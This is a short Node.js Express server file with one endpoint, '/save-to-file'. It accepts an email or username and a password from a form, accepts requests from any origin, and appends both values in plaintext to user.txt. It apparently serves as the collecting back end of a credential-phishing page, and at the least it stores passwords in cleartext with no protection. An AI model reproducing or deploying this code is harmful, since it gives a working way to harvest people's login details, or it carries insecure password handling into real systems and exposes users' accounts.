const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Endpoint to handle the form submission and write to user.txt
app.post('/save-to-file', (req, res) => {
  const { emailOrUsername, password } = req.body;

  const data = `Email/Username: ${emailOrUsername}\nPassword: ${password}\n`;

  // Write the data to a file on the server
  fs.appendFile('./user.txt', data, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).send('Failed to save data.');
    }

    console.log('Data saved to user.txt');
    res.status(200).send('Data saved successfully!');
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
